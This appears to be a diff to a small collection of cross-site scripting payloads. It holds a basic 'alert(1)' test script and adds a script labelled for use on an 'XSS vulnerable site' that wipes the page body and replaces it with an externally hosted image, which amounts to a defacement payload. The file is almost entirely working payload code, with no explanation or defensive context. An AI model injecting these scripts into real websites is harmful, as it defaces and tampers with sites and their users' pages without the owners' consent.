@@ -1,3 +1,10 @@
 # basic html alert
-
 <script>alert(1)</script>
+
+# Html script for input image in a XSS vulnerable site.
+<script>
+document.body.innerHTML="";
+var imagem=new Image();
+imagem.src="https://img.freepik.com/vetores-gratis/rosquinhas-vitrificadas-coloridas-fugindo-em-panico-ilustracao-de-desenho-animado_74855-17017.jpg";
+document.body.appendChild(imagem);
+</script>
